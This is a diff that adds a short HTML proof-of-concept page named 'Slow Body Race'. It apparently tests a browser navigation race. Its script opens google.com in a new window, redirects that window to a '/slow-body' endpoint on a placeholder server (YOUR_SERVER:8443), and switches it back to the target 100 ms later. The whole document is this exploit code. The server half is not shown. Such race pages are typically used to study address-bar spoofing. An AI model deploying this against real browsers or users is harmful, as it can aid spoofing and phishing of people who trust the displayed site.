@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PoC A - Slow Body</title></head>
+<body>
+
+<h2>Slow Body Race</h2>
+<button onclick="run()">Run</button>
+
+<script>
+const TARGET = "https://www.google.com";
+const SERVER = "https://YOUR_SERVER:8443";
+
+function run() {
+  const w = window.open(TARGET);
+
+  setTimeout(() => {
+    w.location.href = SERVER + "/slow-body";
+
+    setTimeout(() => {
+      w.location.href = TARGET;
+    }, 100);
+
+  }, 2000);
+}
+</script>
+
+</body>
+</html>
